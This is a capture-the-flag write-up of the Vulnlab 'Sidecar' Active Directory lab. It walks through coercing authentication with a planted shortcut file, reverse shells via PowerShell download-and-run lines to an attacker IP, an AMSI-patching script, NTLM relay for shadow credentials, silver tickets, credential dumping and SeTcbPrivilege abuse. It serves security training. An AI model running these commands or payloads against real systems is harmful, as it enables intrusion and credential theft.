
# Vulnlab - Sidecar

## NMAP

### DC01.Sidecar.vl

```bash
PORT     STATE SERVICE       VERSION              
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-02-25 17:18:09Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: Sidecar.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject:                                    
| Subject Alternative Name: DNS:DC01.Sidecar.vl, DNS:Sidecar.vl, DNS:SIDECAR                                    
| Issuer: commonName=Sidecar-CA                                
| Public Key type: rsa                   
| Public Key bits: 2048                          
| Signature Algorithm: sha256WithRSAEncryption    
| Not valid before: 2023-12-10T15:56:40
| Not valid after:  2024-12-09T15:56:40
| MD5:   62c47cef2e582ad7f5f891a6b9702ba6
|_SHA-1: b6de4e43affd1d6bef93178d2b930940b60f7c96
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: Sidecar.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.Sidecar.vl, DNS:Sidecar.vl, DNS:SIDECAR
| Issuer: commonName=Sidecar-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-12-10T15:56:40
| Not valid after:  2024-12-09T15:56:40
| MD5:   62c47cef2e582ad7f5f891a6b9702ba6
|_SHA-1: b6de4e43affd1d6bef93178d2b930940b60f7c96
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: Sidecar.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.Sidecar.vl, DNS:Sidecar.vl, DNS:SIDECAR
| Issuer: commonName=Sidecar-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-12-10T15:56:40
| Not valid after:  2024-12-09T15:56:40
| MD5:   62c47cef2e582ad7f5f891a6b9702ba6
|_SHA-1: b6de4e43affd1d6bef93178d2b930940b60f7c96
|_ssl-date: TLS randomness does not represent time
3389/tcp open  ms-wbt-server Microsoft Terminal Services 
| ssl-cert: Subject: commonName=DC01.Sidecar.vl

```


### WS01.Sidecar.vl

```bash
PORT     STATE SERVICE            VERSION
135/tcp  open  msrpc              Microsoft Windows RPC
139/tcp  open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds       Windows 10 Enterprise 10240 microsoft-ds (workgroup: SIDECAR)
3389/tcp open  ssl/ms-wbt-server?         
|_ssl-date: 2024-02-25T17:19:47+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=ws01.Sidecar.vl
| Issuer: commonName=ws01.Sidecar.vl
| Public Key type: rsa               
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2023-12-01T14:50:58
| Not valid after:  2024-06-01T14:50:58
| MD5:   bf95054282951a4ae25f660daffd32e6   
|_SHA-1: 13534e4043fc6a14dd761489803358e0306608ba
| rdp-ntlm-info:              
|   Target_Name: SIDECAR                             
|   NetBIOS_Domain_Name: SIDECAR
|   NetBIOS_Computer_Name: WS01    
|   DNS_Domain_Name: Sidecar.vl
|   DNS_Computer_Name: ws01.Sidecar.vl
|   DNS_Tree_Name: Sidecar.vl
|   Product_Version: 10.0.10240
|_  System_Time: 2024-02-25T17:19:37+00:00
```

We can enumerate users right off the bat with `lookupsid` by specifying guest account with a null password

```bash
lookupsid.py guest@DC01.sidecar.vl 10000
```

<img src="https://i.imgur.com/PSuhZKu.png"/>

From here we can try performing AS-REP roasting using `GetNPUsers` but we get nothing

<img src="https://i.imgur.com/34cZ0r4.png"/>

## PORT 445 (SMB)

On DC01, we can access `Public` share available with anonymous login

<img src="https://i.imgur.com/VD1rZVc.png"/>

<img src="https://i.imgur.com/E3J4LgP.png"/>

Only  `Common` directory is accessible which has few shortcut files

<img src="https://i.imgur.com/JpXW7Pi.png"/>

We can upload  a malicious lnk to coerce authentication from the user who'll open  this file, the lnk file  can be done created manually from windows

<img src="https://i.imgur.com/ia5ATYB.png"/>

Uploading and running `responder` 

<img src="https://i.imgur.com/lQYR3jK.png"/>

However this hash cannot be cracked

<img src="https://i.imgur.com/gfz0r0m.png"/>

## Gaining shell as E.Klaymore

But we don't need to crack this hash neither relay it as we can execute commands from lnk file, we can try to make a request on our python server

```powershell
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c Invoke-WebRequest -Uri 10.8.0.136 -OutFile C:/Windows/Temp/test
```

<img src="https://i.imgur.com/qUSMpAk.png"/>

Now testing out to get a shell with nc

```powershell
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c Invoke-WebRequest -Uri 10.8.0.136/nc64.exe -OutFile C:/Windows/Temp/nc.exe;C:/windows/Temp/nc.exe 10.8.0.136 2222 -e powershell.exe
```

From this we do get a connection back but commands don't run, most probably this has AV enabled

<img src="https://i.imgur.com/GxuzRTw.png"/>

For bypassing this, I used havoc payload and, generating raw shell code using donut and obfuscating it through Scarecrow

<img src="https://i.imgur.com/94DZP1n.png"/>

```bash
donut -i payload.exe -a x64 -o payload.bin
```

<img src="https://i.imgur.com/A6DbTSj.png"/>

```bash
ScareCrow -I ./payload.bin --domain microsoft.com
```

<img src="https://i.imgur.com/r2gf7VO.png"/>

<img src="https://i.imgur.com/ntTYVDH.png"/>

On havoc we'll get a beacon as E.klaymore, running `whoami /all` to check the privileges

<img src="https://i.imgur.com/s9Xsvzr.png"/>
<img src="https://i.imgur.com/MCVASza.png"/>

Here we can utilize `dotnet inline-execute` to execute .NET binaries in the beacon's memory

```bash
dotnet inline-execute /opt/AD-Windows-Enum/SharpHound.exe "-c all"
```

<img src="https://i.imgur.com/Ihd3ELN.png"/>

And downloading it with `download` , we can find this archive in havoc's loot folder

<img src="https://i.imgur.com/QmpmPls.png"/>

We can find this archive in havoc's loot folder

<img src="https://i.imgur.com/6HcIxaB.png"/>

From e.klaymore we don't see any path for escalation 

<img src="https://i.imgur.com/gWduUlr.png"/>

Using `GetWebDAVStatus` we can verify if the webclient (WebDAV) service is enabled

<img src="https://i.imgur.com/XJfl5Mh.png"/>

Even tho it shows it's not enabled, we can still explicitly enabled it by mapping the drive to our IP address with `responder` running

<img src="https://i.imgur.com/NRW67Io.png"/>

```bash
shell "net use h: http://10.8.0.136/"
```

<img src="https://i.imgur.com/lDN9TjU.png"/>
<img src="https://i.imgur.com/Ws5V2M2.png"/>

## Performing Shadow Credentials through NTLM Relay

We have now have webdav enabled on ws01, now to receive coerce authentication from WS01 we can use any poc for coercion also we need to add a record for our kali IP in DNS as this can be only done on domain joined machines, for that we can use `Powermad.ps1` and for bypassing AMSI we can use this script

https://github.com/senzee1984/Amsi_Bypass_In_2023


```powershell

# AMSI Bypass
function LookupFunc {
    Param ($moduleName, $functionName)
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
     Equals('System.dll')
     }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -like "Ge*P*oc*ddress") {$tmp+=$_}}
    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,
@($moduleName)), $functionName))
}


function getDelegateType {
    Param (
     [Parameter(Position = 0, Mandatory = $True)] [Type[]]
     $func, [Parameter(Position = 1)] [Type] $delType = [Void]
    )
    $type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
[System.Reflection.Emit.AssemblyBuilderAccess]::Run).
    DefineDynamicModule('InMemoryModule', $false).
    DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass,
    AutoClass', [System.MulticastDelegate])

  $type.
    DefineConstructor('RTSpecialName, HideBySig, Public',
[System.Reflection.CallingConventions]::Standard, $func).
     SetImplementationFlags('Runtime, Managed')

  $type.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType,
$func). SetImplementationFlags('Runtime, Managed')
    return $type.CreateType()
}

$a="A"
$b="msiS"
$c="canB"
$d="uffer"
[IntPtr]$funcAddr = LookupFunc amsi.dll ($a+$b+$c+$d)
$oldProtectionBuffer = 0
$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
$vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)
$buf = [Byte[]] (0xb8,0x34,0x12,0x07,0x80,0x66,0xb8,0x32,0x00,0xb0,0x57,0xc3)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 12)

# Using powermad to add DNS record for our IP
IEX(New-Object Net.WebClient).downloadString('http://10.8.0.136/Powermad.ps1')
New-ADIDNSNode -Tombstone -Verbose -Node * -Data 10.8.0.136
```

<img src="https://i.imgur.com/FhVhb2V.png"/>

<img src="https://i.imgur.com/5Ju93Ku.png"/>

https://github.com/jtmpu/PrecompiledBinaries

Using SpoolSample for coercion as it's build with .NET we can run it using dotnet inline-execute, confirming we are getting the NTLMv2 challenge response from `WS01$`

```bash
dotnet inline-execute /opt/AD-Windows-Enum/SpoolSample.exe 10.10.183.214 WIN-KINFFE92UBV@80/test
```

<img src="https://i.imgur.com/sJ3IwaQ.png"/>

<img src="https://i.imgur.com/Va9J646.png"/>

Disabling HTTP, SMB and LDAP on responder so that we can use ntlmrealyx to relay WS01 hash for performing `Resourse Based Constrained Delegation (RBCD)`

<img src="https://i.imgur.com/GDEuVR4.png"/>

```bash
ntlmrelayx.py -t ldaps://DC01.sidecar.vl --delegate-access -smb2support
```

We are suceessful in realying the authentication from WS01 but this wasn't able to create machine account and perform the attack

<img src="https://i.imgur.com/iKvgre9.png"/>

Enumerating`ms-DS-MachineAccountQuota` with `StandIn` which is a .NET binary for enumerating AD

```powershell
dotnet inline-execute /opt/AD-Windows-Enum/StandIn_v13_Net45.exe --object ms-DS-MachineAccountQuota=*
```

<img src="https://i.imgur.com/JdMIuuc.png"/>
<img src="https://i.imgur.com/MzottTd.png"/>

The property value is 0 so we cannot a machine account, RCBD fails here but it still possible to utilize coercion from WS01$ if there's ADCS installed on domain

<img src="https://i.imgur.com/4YFBB7z.png"/>

Verifying the presences of ADCS server, we can perform `Shadow Credentials` by adding a certificate in `msDS-KeyCredentialLink` property of WS01$ account for alternate authentication using `PKINIT` , this feature isn't in current repo of ntlmrealyx so switching the branch to `shadowcredentials`

<img src="https://i.imgur.com/x9NJbYE.png"/>

```bash
ntlmrelayx.py -t ldaps://DC01.sidecar.vl --shadow-credentials --shadow-target 'WS01$'
```

<img src="https://i.imgur.com/mtvlnke.png"/>

## Impersonating as local admin on WS01

Through PKINIT tools we can get the TGT/NTHash for WS01

```bash
python3 /opt/PKINITtools/gettgtpkinit.py -cert-pfx 3cIlkuYb.pfx -pfx-pass Fc0RJ71jot050cNh4MJi sidecar.vl/'WS01$' 3cIlkuYb.ccache
```

<img src="https://i.imgur.com/RncFz8f.png"/>

```bash
python3 /opt/PKINITtools/getnthash.py -key '040534a41a4b07cdaf0082333e26aa693a9eb4897f171df1b94eb66be40a0dd3' sidecar.vl/'WS01$'
```

<img src="https://i.imgur.com/2JmmP27.png"/>

To impersonate as local admin on WS01, creating silver ticket with `ticketer.py`

```bash
ticketer.py -domain-sid S-1-5-21-3976908837-939936849-1028625813 -domain sidecar.vl -spn HOST/WS01.sidecar.vl -nthash 40************24 -user-id 500 Administrator 
```

<img src="https://i.imgur.com/Ogx7tGP.png"/>

```bash
secretsdump.py 'administrator'@WS01.Sidecar.vl -k -no-pass
```

<img src="https://i.imgur.com/fv6XdWQ.png"/>

Using `smbexec.py` we can get a shell on WS01

<img src="https://i.imgur.com/hJoHiXZ.png"/>

## Password sparying on svc_deploy

Moving forward, we have `Deployer` which has a resemblance with a domain user `svc_deploy` which has permissions to login on DC01

<img src="https://i.imgur.com/fwHXmNf.png"/>

Through cracksation we can recover deployer's password and reuse it on svc_deploy

<img src="https://i.imgur.com/YmSVeyF.png"/>

<img src="https://i.imgur.com/JRUVcZ9.png"/>

Checking the privilege, this user has `SeTcbPrivilege` enabled

<img src="https://i.imgur.com/JlNrSb4.png"/>

This privilege can be used for creating access tokens, acting as any user without needing their credentials or can run processes as SYSTEM user, using this poc https://gist.github.com/antonioCoco/19563adef860614b56d010d92e67d178 from  antonioCoco https://twitter.com/splinter_code?lang=en

Compiling this poc through Visual Studio with Release build

<img src="https://i.imgur.com/LNpnQAn.png"/>

For abusing this we can create a new user and make him a local administrator on DC

```bash
SeTcbPrivilege.exe UwU "C:\Windows\System32\cmd.exe /c net user arz P@ssw0rd /add && net localgroup administrators arz /add"
```

<img src="https://i.imgur.com/thJpDtS.png"/>
Now we can just login again through winrm

<img src="https://i.imgur.com/pfyKG8t.png"/>
# References

- https://www.thehacker.recipes/a-d/movement/mitm-and-coerced-authentications/living-off-the-land
- https://pikaroot.github.io/_blogs/2023-02-25-HAVOC_Framework
- https://assume-breach.medium.com/home-grown-red-team-getting-system-on-windows-11-with-havoc-c2-cc4bb089d22
- https://github.com/G0ldenGunSec/GetWebDAVStatus
- https://www.thehacker.recipes/a-d/movement/mitm-and-coerced-authentications/adidns-spoofing
- https://github.com/senzee1984/Amsi_Bypass_In_2023
- https://github.com/jtmpu/PrecompiledBinaries
- https://github.com/FuzzySecurity/StandIn/releases/download/v1.3/StandIn_v13_Net35_45.zip
- https://github.com/ShutdownRepo/impacket/tree/shadowcredentials
- https://github.com/med0x2e/NTLMRelay2Self/tree/main
- https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations
- https://gist.github.com/antonioCoco/19563adef860614b56d010d92e67d178
